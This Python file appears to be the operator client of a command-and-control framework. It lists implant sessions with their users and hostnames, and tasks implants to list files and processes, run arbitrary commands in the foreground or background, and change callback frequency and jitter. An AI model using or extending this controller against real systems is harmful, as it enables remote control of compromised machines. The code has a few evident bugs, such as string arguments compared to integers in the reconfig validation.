#!/usr/bin/python3
import httpx
import shlex
import base64
import binascii

from prettytable import PrettyTable

from prompt_toolkit import PromptSession
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.styles import Style
from prompt_toolkit import print_formatted_text

# local imports
from client_helper.user_manager import fix_date
from client_helper.tasking_manager import get_tasking, send_task

# colors for the sessions prompt
style_session = Style.from_dict(
    {
        "": "#FFFAF0",
        "host": "#f20707",
        "arrow": "#FFFAF0",
    }
)

# the prompty layout and design for the session context
message_session = [("class:host", "!session"), ("class:arrow", " > ")]

# valid commands for the session context
cmds_session = WordCompleter(
    [
        "info",
        "ls",
        "exec_fg",
        "exec_bg",
        "back",
        "upload",
        "ps",
        "tasking",
        "view",
        "reconfig",
        "help",
    ]
)


def format_output(output: str) -> str:
    '''
    Takes base64 encoded hex string from the lighthouse server and decodes it to a readable format.
    :param output: The base64 encoded hex string from the server
    :return: A decoded string or an error message if decoding fails
    '''
    try:
        decoded_bytes = bytes.fromhex(output)
        decoded_base = base64.b64decode(decoded_bytes.decode("utf-8")).decode("utf-8")
        return decoded_base
    except (binascii.Error, UnicodeDecodeError, ValueError) as e:
        print_formatted_text(f"[*] Error decoding output: {e}")
        return ""


def get_result(token: str, server: str, session: str, id: int) -> None:
    '''
    Get the result of a specific task for a session from the lighthouse server.
    :param token: The authentication token for the lighthouse server
    :param server: The lighthouse server address
    :param session: The session ID to which the task belongs
    :param id: The ID of the task result to retrieve
    :return: None
    '''
    url = f"http://{server}/results/{session}/{id}"
    headers = {
        "accept": "application/json",
        "Authorization": f"Bearer {token}",
    }

    response = httpx.get(url, headers=headers)
    if response.status_code == 404:
        print_formatted_text(f"[*] Session id {session} not found!")
    elif response.status_code == 416:
        print_formatted_text(f"[*] ID {id} not found for session {session}")
    elif (
        response.status_code == 401
        and response.json().get("detail") == "Bad Credentials"
    ):
        print_formatted_text("[*] Invalid token...time to reauthenticate")
    elif response.status_code == 200:
        result = response.json()
        table = PrettyTable()
        table.field_names = ["ID", "Session", "Date Received", "Task", "Args"]
        id = result.get("id")
        session_id = result.get("session")
        date_received = result.get("date", "Null")
        if date_received != "Null":
            date_received_formatted = fix_date(date_received)
        else:
            date_received_formatted = "Null"
        task = result.get("task", "Null")
        args = result.get("args", "Null")
        table.add_row([id, session_id, date_received_formatted, task, args])
        print_formatted_text(table)
        output = result.get("results", "Null")
        print_formatted_text(format_output(output))
    else:
        print_formatted_text(response.status_code, response.text, response)


def format_sessions(sessions: list) -> None:
    '''
    Formats the session data into a table for display in the merchant client.
    :param sessions: A list of session dictionaries containing session data
    :return: None
    '''
    if isinstance(sessions, list):
        table = PrettyTable()
        table.field_names = [
            "Session",
            "Alive",
            "Last Seen",
            "First Seen",
            "CB Freq(m)",
            "User",
            "Hostname",
        ]
        for session in sessions:
            session_id = session.get("session", "Null")
            status = session.get("alive", "Null")
            last_seen = session.get("last_checkin", "Null")
            if last_seen != "Null":
                last_seen_formatted = fix_date(last_seen)
            first_seen = session.get("first_checkin", "Null")
            if first_seen != "Null":
                first_seen_formatted = fix_date(first_seen)
            cb_freq = session.get("callback_freq", "Null")
            user = session.get("username", "Null")
            hostname = session.get("hostname", "Null")
            table.add_row(
                [
                    session_id,
                    status,
                    last_seen_formatted,
                    first_seen_formatted,
                    cb_freq,
                    user,
                    hostname,
                ]
            )
    print_formatted_text(table)


def get_sessions(token: str, server: str) -> None:
    '''
    Grab all sessions from the lighthouse server. Data will be returned in a json array,
    data is passed to format_session() to properly display the session data
    :param token: The token used to auth to lighthouse server
    :param server: The uri for the lighthouse server to retrieve the sessions
    :return: None
    '''
    url = f"http://{server}/implants/"
    headers = {
        "accept": "application/json",
        "Authorization": f"Bearer {token}",
    }
    response = httpx.get(url, headers=headers)
    if (
        response.status_code == 401
        and response.json().get("detail") == "Bad Credentials"
    ):
        print_formatted_text("[*] Invalid token...time to reauthenticate")
        
    elif response.status_code == 200 and isinstance(response.json(), list):
        # proper json array
        format_sessions(response.json())
    else:
        print_formatted_text("[*] Invalid data format")
        print_formatted_text(response.status_code, response.text, response)
        


def test_session(token: str, server: str, session: str) -> int:
    '''
    Test if a session id is a valid session (either alive or dead) with the lighthouse server
    We have this function as a pre-check before attempting to interact with an implant session
    :param token: The token used to auth to lighthouse server
    :param server: The uri for the lighthouse server to retrieve the sessions
    :param session: The session id to check 
    :return: None
    '''
    url = f"http://{server}/implants/{session}"
    headers = {
        "accept": "application/json",
        "Authorization": f"Bearer {token}",
    }
    response = httpx.get(url, headers=headers)
    return response.status_code


def get_session(token: str, server: str, session: str) -> int:
    '''
    Get information about a specific session from the lighthouse server
    :param token: The token used to auth to lighthouse server
    :param server: The uri for the lighthouse server to retrieve the sessions
    :param session: The session to retrieve information about from the lighthouse server
    :return: The status code from the lighthouse server
    '''
    url = f"http://{server}/implants/{session}"
    headers = {
        "accept": "application/json",
        "Authorization": f"Bearer {token}",
    }
    response = httpx.get(url, headers=headers)
    if response.status_code == 200:
        session = response.json()
        table = PrettyTable()
        table.field_names = [
            "Session",
            "Alive",
            "Last Seen",
            "First Seen",
            "CB Freq(m)",
            "User",
            "Hostname",
        ]

        session_id = session.get("session", "Null")
        status = session.get("alive", "Null")
        last_seen = session.get("last_checkin", "Null")
        if last_seen != "Null":
            last_seen_formatted = fix_date(last_seen)
        first_seen = session.get("first_checkin", "Null")
        if first_seen != "Null":
            first_seen_formatted = fix_date(first_seen)
        cb_freq = session.get("callback_freq", "Null")
        user = session.get("username", "Null")
        hostname = session.get("hostname", "Null")
        table.add_row(
            [
                session_id,
                status,
                last_seen_formatted,
                first_seen_formatted,
                cb_freq,
                user,
                hostname,
            ]
        )
        print_formatted_text(table)
    elif response.status_code == 404:
        print_formatted_text(f"[*] Session id {session} not found!")
    elif (
        response.status_code == 401
        and response.json().get("detail") == "Bad Credentials"
    ):
        print_formatted_text("[*] Invalid token...time to reauthenticate")
        
    else:
        print_formatted_text(response.status_code, response.text, response)
    return response.status_code


def interact_implant(token: str, server: str, session_id: str) -> None:
    '''
    Main interact loop to swap context into a specific implant session. Used to take in user input from the tasking
    context and pass it to the session_router() function for validation and shipping to the lighthouse server.
    :param token: The token used to auth to lighthouse server
    :param server: The uri for the lighthouse server to retrieve the sessions
    :param session_id: The session id to interact with
    :return: None
    '''
    interact = PromptSession()
    while True:
        options = interact.prompt(
            message=message_session, style=style_session, completer=cmds_session
        )
        options = options.lower().strip()
        try:
            parsed = shlex.split(options)
        except ValueError as e:
            print_formatted_text(f"[*] Input parsing error: {e}")
            continue

        if not parsed:
            continue

        cmd = parsed[0].lower()
        args = parsed[1:]

        if cmd == "back":
            # drop back to the server context (leave implant context)
            return

        session_router(cmd, args, token, server, session_id)


def session_router(cmd: str, args: list, token: str, server: str, session_id: str) -> None:
    '''
    The session router that will take user input and ensure it is a valid command. It will then pass the 
    validated command to the correct function for shipping to the lighthouse server
    :param cmd: The command the user wishes to enter
    :param args: The arguments for the base command
    :param token: The token used to auth to lighthouse server
    :param server: The uri for the lighthouse server to retrieve the sessions
    :param session_id: The session id the tasking should be tied to
    :return: None
    '''
    if cmd == "info":
        get_session(token, server, session_id)
    elif cmd == "ls":
        if len(args) == 1:
            send_task(token, server, session_id, "ls", args[0])
        else:
            send_task(token, server, session_id, "ls", "")
    elif cmd == "tasking":
        get_tasking(token, session_id, server)
    elif cmd == "ps":
        send_task(token, server, session_id, "ps", "")
    elif cmd == "exec_fg":
        if len(args) == 1:
            send_task(token, server, session_id, "exec_fg", args[0])
        else:
            print_formatted_text("[*] Expecting command -> exec_fg '<command>'")
    elif cmd == "exec_bg":
        if len(args) == 1:
            send_task(token, server, session_id, "exec_bg", args[0])
        else:
            print_formatted_text("[*] Expecting command -> exec_bg '<command>'")
    elif cmd == "reconfig":
        if not validate_reconfig_values(args):
            return
        if len(args) == 3 and validate_reconfig(args):
            send_task(token, server, session_id, "reconfig", ' '.join(args[0:]))
        else:
            print_formatted_text("[*] Expecting reconfig <callback freq> <jitter> <max errors>")
    elif cmd == "view":
        if len(args) == 1:
            get_result(token, server, session_id, int(args[0]))
        else:
            print_formatted_text("[*] Expecting task id -> view <task-id>")


def validate_reconfig_values(args):
    if args[0] < 1:
        print_formatted_text("[*] Cannot set callbacks to lower than one minute")
        return False
    if args[1] > 100 or args[1] < 1:
        print_formatted_text("[*] Jitter is a \%\ of call back frequency, cannot be outside 0-100")
        return False
    if args[2] < 5:
        print_formatted_text("[*] Cannot except a max errors before self terminate lower than 5")
        return False
    return True

# we dont validate these args on the implant side to try and 
# keep the size of agent code down, so really validate here
def validate_reconfig(args) -> bool:
    for arg in args:
        try:
            int(arg)
        except ValueError:
            return False
    return True
